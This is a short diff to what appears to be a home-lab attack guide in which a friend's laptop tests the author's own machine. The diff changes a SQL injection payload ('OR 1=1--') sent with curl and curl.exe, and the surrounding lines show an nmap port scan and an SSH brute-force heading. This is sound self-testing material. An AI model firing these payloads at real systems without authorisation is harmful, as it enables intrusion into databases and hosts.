@@ -98,10 +98,10 @@ nmap -p 1-1000 -T4 <MY_IP>
 **[FRIEND LAPTOP]** Attack 2: Web Exploit (SQL Injection)
 ```bash
 # Linux / Mac
-curl "http://<MY_IP>/?id=1' OR '1'='1"
+curl "http://<MY_IP>/?id=1' OR 1=1--"
 
 # Windows (CMD / PowerShell)
-curl.exe "http://<MY_IP>/?id=1' OR '1'='1"
+curl.exe "http://<MY_IP>/?id=1' OR 1=1--"
 ```
 
 **[FRIEND LAPTOP]** Attack 3: SSH Brute Force
